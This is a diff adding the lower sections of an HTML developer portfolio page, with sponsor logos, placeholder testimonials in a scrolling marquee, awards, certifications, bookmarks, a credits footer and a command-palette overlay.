+                        </div>
+                    </div>
+                </div>
+
+                <!-- Silver Sponsors -->
+                <div class="sponsor-row reveal">
+                    <h3 class="sponsor-tier-label">Silver Sponsors</h3>
+                    <div class="sponsor-grid glass-card">
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/notion" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">Notion</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/buymeacoffee" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">Buy Me a Coffee</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/patreon" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">Patreon</span>
+                        </div>
+                        <div class="sponsor-cell">
+                            <img src="https://cdn.simpleicons.org/github" alt="" class="sponsor-logo" width="20" height="20" loading="lazy">
+                            <span class="sponsor-name">GitHub Sponsors</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Testimonials 2-row Marquee Slider -->
+        <section id="testimonials" class="space-y-8 overflow-hidden py-6 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight mb-4">What People Say</h2>
+            <div
+                class="relative w-full border-y border-zinc-200/80 dark:border-zinc-800/50 py-8 bg-zinc-50/50 dark:bg-zinc-900/10">
+                <div
+                    class="absolute inset-y-0 left-0 w-24 bg-gradient-to-r from-zinc-50 dark:from-[#08080a] to-transparent z-10">
+                </div>
+                <div
+                    class="absolute inset-y-0 right-0 w-24 bg-gradient-to-l from-zinc-50 dark:from-[#08080a] to-transparent z-10">
+                </div>
+
+                <div class="flex flex-col gap-8">
+                    <!-- Row 1: scroll left -->
+                    <div class="marquee-track overflow-hidden">
+                        <div class="animate-marquee-left flex items-stretch gap-8 pr-8">
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Awesome work, love the design."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=11" alt="John Doe" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">John Doe</div><div class="text-xs text-zinc-500">Software Engineer</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Looks great. The details are impressive."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=5" alt="Sarah Lee" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Sarah Lee</div><div class="text-xs text-zinc-500">Product Designer</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Goated portfolio design, absolutely clean."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=8" alt="Mike Ross" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Mike Ross</div><div class="text-xs text-zinc-500">CTO</div></div>
+                                </div>
+                            </div>
+                            <!-- duplicate set for seamless loop -->
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between" aria-hidden="true">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Awesome work, love the design."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=11" alt="John Doe" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">John Doe</div><div class="text-xs text-zinc-500">Software Engineer</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between" aria-hidden="true">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Looks great. The details are impressive."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=5" alt="Sarah Lee" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Sarah Lee</div><div class="text-xs text-zinc-500">Product Designer</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between" aria-hidden="true">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Goated portfolio design, absolutely clean."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=8" alt="Mike Ross" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Mike Ross</div><div class="text-xs text-zinc-500">CTO</div></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Row 2: scroll right -->
+                    <div class="marquee-track overflow-hidden">
+                        <div class="animate-marquee-right flex items-stretch gap-8 pr-8">
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Cleanest UI layouts I have seen in a long time."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=9" alt="Alice Wong" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Alice Wong</div><div class="text-xs text-zinc-500">PM</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Highly recommended, very detail-oriented engineer."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=3" alt="Bob Taylor" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Bob Taylor</div><div class="text-xs text-zinc-500">Tech Lead</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Outstanding execution of the product design vision."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=15" alt="Chris King" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Chris King</div><div class="text-xs text-zinc-500">Founder</div></div>
+                                </div>
+                            </div>
+                            <!-- duplicate set -->
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between" aria-hidden="true">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Cleanest UI layouts I have seen in a long time."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=9" alt="Alice Wong" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Alice Wong</div><div class="text-xs text-zinc-500">PM</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between" aria-hidden="true">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Highly recommended, very detail-oriented engineer."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=3" alt="Bob Taylor" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Bob Taylor</div><div class="text-xs text-zinc-500">Tech Lead</div></div>
+                                </div>
+                            </div>
+                            <div class="glass-card testimonial-card shrink-0 p-5 rounded-2xl flex flex-col justify-between" aria-hidden="true">
+                                <p class="text-sm text-zinc-600 dark:text-zinc-400 italic mb-4">"Outstanding execution of the product design vision."</p>
+                                <div class="flex items-center gap-3">
+                                    <img src="https://i.pravatar.cc/80?img=15" alt="Chris King" class="testimonial-avatar" loading="lazy" width="36" height="36">
+                                    <div><div class="text-sm font-semibold">Chris King</div><div class="text-xs text-zinc-500">Founder</div></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Awards Section -->
+        <section id="awards" class="space-y-6 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Awards</h2>
+            <div
+                class="glass-card rounded-2xl overflow-hidden">
+                <div
+                    class="flex justify-between items-center p-4 border-b border-zinc-200/60 dark:border-zinc-800/60 hover:bg-white/40 dark:hover:bg-zinc-900/40 transition-colors">
+                    <div>
+                        <div class="font-semibold text-sm">Best Front-End Architecture</div>
+                        <div class="text-xs text-zinc-500">Web Design Gala &bull; 1st Place</div>
+                    </div>
+                    <div class="flex items-center space-x-3">
+                        <span class="text-xs font-mono text-zinc-450">2023</span>
+                        <a href="https://example.com" target="_blank"
+                            class="text-zinc-400 hover:text-zinc-950 dark:hover:text-white transition-colors"
+                            aria-label="Proof"><i data-feather="external-link" class="w-3.5 h-3.5"></i></a>
+                    </div>
+                </div>
+                <div
+                    class="flex justify-between items-center p-4 border-b border-zinc-200 dark:border-zinc-850 hover:bg-zinc-50 dark:hover:bg-zinc-900/40 transition-colors">
+                    <div>
+                        <div class="font-semibold text-sm">Outstanding Contributor</div>
+                        <div class="text-xs text-zinc-500">Global Open-Source Summit &bull; Gold Medal</div>
+                    </div>
+                    <div class="flex items-center space-x-3">
+                        <span class="text-xs font-mono text-zinc-455">2022</span>
+                        <a href="https://example.com" target="_blank"
+                            class="text-zinc-400 hover:text-zinc-950 dark:hover:text-white transition-colors"
+                            aria-label="Proof"><i data-feather="external-link" class="w-3.5 h-3.5"></i></a>
+                    </div>
+                </div>
+                <div
+                    class="flex justify-between items-center p-4 hover:bg-zinc-50 dark:hover:bg-zinc-900/40 transition-colors">
+                    <div>
+                        <div class="font-semibold text-sm">Pixel Perfect UI Design Award</div>
+                        <div class="text-xs text-zinc-500">Developer Choice &bull; Honorable Mention</div>
+                    </div>
+                    <div class="flex items-center space-x-3">
+                        <span class="text-xs font-mono text-zinc-455">2021</span>
+                        <a href="https://example.com" target="_blank"
+                            class="text-zinc-400 hover:text-zinc-950 dark:hover:text-white transition-colors"
+                            aria-label="Proof"><i data-feather="external-link" class="w-3.5 h-3.5"></i></a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Certifications Section -->
+        <section id="certs" class="space-y-6 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Certifications</h2>
+            <div
+                class="glass-card rounded-2xl overflow-hidden">
+                <a href="https://example.com" target="_blank"
+                    class="flex justify-between items-center p-4 hover:bg-zinc-50 dark:hover:bg-zinc-900/40 transition-colors block">
+                    <div>
+                        <div class="font-semibold text-sm">Advanced Front-End Engineer</div>
+                        <div class="text-xs text-zinc-550">Tech Institute</div>
+                    </div>
+                    <i data-feather="external-link" class="w-3.5 h-3.5 text-zinc-400"></i>
+                </a>
+            </div>
+        </section>
+
+        <!-- Bookmarks Section -->
+        <section id="bookmarks" class="space-y-8 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Bookmarks</h2>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <a href="https://shadcn.com" target="_blank"
+                    class="glass-card p-4 rounded-xl hover:border-zinc-300 dark:hover:border-zinc-700 transition-colors flex justify-between items-center group">
+                    <div>
+                        <span class="text-xs font-mono text-zinc-400 block mb-1">June 2023</span>
+                        <span class="text-sm font-semibold group-hover:text-violet-500 transition-colors">shadcn/ui
+                            Design Tokens</span>
+                    </div>
+                    <i data-feather="bookmark" class="w-4 h-4 text-zinc-400"></i>
+                </a>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer
+        class="border-t border-zinc-200 dark:border-zinc-800/50 mt-16 bg-white dark:bg-[#070709] py-12 relative z-10">
+        <div class="max-w-5xl mx-auto px-6 space-y-8 text-xs text-zinc-500 dark:text-zinc-400">
+            <!-- Credits Grid -->
+            <div
+                class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 pb-8 border-b border-zinc-200 dark:border-zinc-800/60">
+                <div class="space-y-2">
+                    <h4 class="font-bold text-zinc-800 dark:text-zinc-300 uppercase tracking-wider text-[10px]">Credit
+                    </h4>
+                    <p>Crafted by <span class="font-semibold text-zinc-900 dark:text-white">Rakid Ahmed</span></p>
+                </div>
+                <div class="space-y-2">
+                    <h4 class="font-bold text-zinc-800 dark:text-zinc-300 uppercase tracking-wider text-[10px]">
+                        Inspirations</h4>
+                    <p class="leading-relaxed">Inspired by: <a href="https://tailwindcss.com" target="_blank"
+                            class="hover:underline">tailwindcss.com</a>, <a href="https://ui.shadcn.com" target="_blank"
+                            class="hover:underline font-medium">ui.shadcn.com</a>, <a href="https://vercel.com"
+                            target="_blank" class="hover:underline font-medium">vercel.com</a>, <a
+                            href="https://evilcharts.com" target="_blank"
+                            class="hover:underline font-medium">evilcharts.com</a>, <a
+                            href="https://devouringdetails.com" target="_blank"
+                            class="hover:underline font-medium">devouringdetails.com</a>, <a
+                            href="https://skiper-ui.com" target="_blank"
+                            class="hover:underline font-medium">skiper-ui.com</a></p>
+                </div>
+                <div class="space-y-2">
+                    <h4 class="font-bold text-zinc-800 dark:text-zinc-300 uppercase tracking-wider text-[10px]">
+                        Infrastructure</h4>
+                    <p>Hosting: <a href="https://vercel.com" target="_blank" class="hover:underline">Vercel</a></p>
+                </div>
+                <div class="space-y-2">
+                    <h4 class="font-bold text-zinc-800 dark:text-zinc-300 uppercase tracking-wider text-[10px]">
+                        Developer</h4>
+                    <p>Source code: <a href="https://github.com/devlowper/telebot-frontend" target="_blank"
+                            class="hover:underline font-mono">GitHub</a></p>
+                    <p>License: <a href="https://github.com/devlowper/telebot-frontend/blob/main/LICENSE"
+                            target="_blank" class="hover:underline">MIT License</a></p>
+                </div>
+            </div>
+
+            <div class="flex flex-col sm:flex-row justify-between items-center gap-4 pt-2">
+                <p>&copy;
+                    <script>document.write(new Date().getFullYear())</script> Rakib Ahmed. All rights reserved.
+                </p>
+                <div class="flex space-x-6">
+                    <span class="text-zinc-400">Design inspired by <a href="https://tailwindcss.com" target="_blank"
+                            class="underline underline-offset-4 hover:text-zinc-900 dark:hover:text-white">chanhdai.com</a></span>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Command Palette Overlay -->
+    <div id="command-palette"
+        class="fixed inset-0 z-50 hidden items-start justify-center pt-[15vh] bg-zinc-955/40 backdrop-blur-sm px-4">
+        <div class="w-full max-w-xl bg-white dark:bg-[#0f0f12] rounded-2xl shadow-2xl border border-zinc-200 dark:border-zinc-800/80 overflow-hidden transform scale-95 opacity-0 animate-in fade-in zoom-in duration-200"
+            style="animation-fill-mode: forwards;">
+            <div class="flex items-center px-4 py-3.5 border-b border-zinc-150 dark:border-zinc-800/80">
+                <i data-feather="search" class="w-4.5 h-4.5 text-zinc-400"></i>
+                <input type="text" id="command-search" placeholder="Search sections, actions, or contacts..."
+                    class="w-full bg-transparent border-none focus:ring-0 text-zinc-900 dark:text-zinc-100 placeholder-zinc-450 px-3 py-1 text-sm outline-none">
+                <span
+                    class="text-[10px] font-mono text-zinc-400 bg-zinc-100 dark:bg-zinc-850 px-1.5 py-0.5 rounded border border-zinc-200 dark:border-zinc-700">ESC</span>
+            </div>
+
+            <div class="py-2.5 max-h-[60vh] overflow-y-auto no-scrollbar">
+                <div class="px-4 py-1.5 text-[10px] font-bold text-zinc-400 uppercase tracking-wider">Navigation</div>
+                <a href="#about"
+                    class="palette-item block px-6 py-2.5 text-sm text-zinc-700 dark:text-zinc-300 hover:bg-zinc-100 dark:hover:bg-zinc-850 transition-colors"
+                    onclick="toggleCommandPalette()">Go to About</a>
+                <a href="#experience"
+                    class="palette-item block px-6 py-2.5 text-sm text-zinc-700 dark:text-zinc-300 hover:bg-zinc-100 dark:hover:bg-zinc-850 transition-colors"
+                    onclick="toggleCommandPalette()">Go to Experience</a>
+                <a href="#projects"
+                    class="palette-item block px-6 py-2.5 text-sm text-zinc-700 dark:text-zinc-300 hover:bg-zinc-100 dark:hover:bg-zinc-850 transition-colors"
+                    onclick="toggleCommandPalette()">Go to Projects</a>
+                <a href="#sponsors"
+                    class="palette-item block px-6 py-2.5 text-sm text-zinc-700 dark:text-zinc-300 hover:bg-zinc-100 dark:hover:bg-zinc-850 transition-colors"
+                    onclick="toggleCommandPalette()">Go to Sponsors</a>
+
+                <div class="px-4 py-1.5 mt-2.5 text-[10px] font-bold text-zinc-400 uppercase tracking-wider">Actions
+                </div>
+                <a href="#"
+                    class="palette-item copy-link block px-6 py-2.5 text-sm text-zinc-700 dark:text-zinc-300 hover:bg-zinc-100 dark:hover:bg-zinc-850 transition-colors"
+                    data-copy="rakib@example.com" onclick="toggleCommandPalette()">Copy Email Address</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="app.js"></script>
 </body>
+
 </html>
